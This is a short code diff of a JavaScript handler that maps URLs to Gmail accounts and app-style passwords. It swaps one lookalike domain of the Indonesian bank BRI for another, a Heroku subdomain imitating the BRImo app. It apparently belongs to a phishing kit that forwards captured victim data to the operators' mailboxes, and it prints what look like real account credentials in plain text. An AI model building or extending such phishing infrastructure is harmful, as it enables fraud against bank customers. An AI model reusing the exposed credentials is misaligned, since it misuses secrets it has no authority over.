@@ -21,9 +21,9 @@ export default function handler(req, res) {
         email = 'brimopasp@gmail.com';
         pass = 'ezbvulgxsjerhpnb';
 
-    } else if(url == 'bri-customerservice.xyz'){
-        email = 'spacediamond95@gmail.com';
-        pass = 'gkpahtwroxntldgs';
+    } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
+        email = 'brigacor80@gmail.com';
+        pass = 'zhzcfhbdtzipldsz';
 
     }
     else {
